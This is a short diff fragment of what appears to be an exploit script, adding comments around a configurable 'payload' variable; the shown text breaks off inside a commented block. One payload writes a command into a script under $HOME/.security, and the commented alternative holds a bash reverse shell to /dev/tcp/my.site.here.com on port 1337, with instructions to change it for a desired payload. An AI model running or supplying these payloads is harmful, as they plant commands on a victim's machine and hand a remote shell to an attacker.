@@ -5,7 +5,9 @@
 
 //Payload to execute 
 //CHANGE THIS FOR DESIRED PAYLOAD !!!!
+// Make sure to leave the echo function in
 var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
+// Another payload example
 /* 
 var payload = `echo "#!/bin/bash
 bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
